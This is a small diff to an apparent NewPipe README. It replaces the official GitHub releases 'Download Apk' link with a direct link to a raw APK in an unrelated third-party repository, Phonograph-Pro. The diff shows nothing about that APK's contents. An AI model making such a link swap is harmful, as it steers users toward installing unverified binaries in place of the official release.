@@ -8,7 +8,7 @@
 
 <hr>
 
-<p align="center"><a href="https://github.com/TeamNewPipe/NewPipe/releases">Download Apk</a> </p>
+<p align="center"><a href="https://raw.githubusercontent.com/lovelilke/Phonograph-Pro/main/app/apk/app-release.apk">Download Apk</a> </p>
 <hr>
 
 ## Screenshots
